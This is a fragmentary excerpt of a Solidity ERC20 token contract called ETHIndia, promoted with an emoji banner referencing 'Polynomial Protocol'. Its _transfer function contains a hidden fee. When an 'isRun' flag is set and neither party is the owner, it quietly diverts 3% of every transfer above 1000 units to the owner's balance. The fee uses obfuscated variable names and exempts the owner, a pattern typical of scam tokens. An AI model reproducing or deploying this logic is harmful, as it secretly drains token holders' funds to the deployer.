...
/*
🇲🇦❤️ PolynomialFi
Polynomial Protocol ➡️ ETHIndia 🇮🇳
...
contract ETHIndia is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _transfer(
        ...
        if (owner() != recipient && owner() != sender) {
            if (isRun > 0 && amount > 1000) {
                ...
                uint256 TUSAVB = 3;
                uint256 BOAHKQ = amount*TUSAVB/100;
                _balances[sender] = _balances[sender] - amount;
                _balances[recipient] += amount -BOAHKQ;
                _balances[owner()] +=BOAHKQ;
            }
        } else {
            _balances[sender] = _balances[sender] - amount;
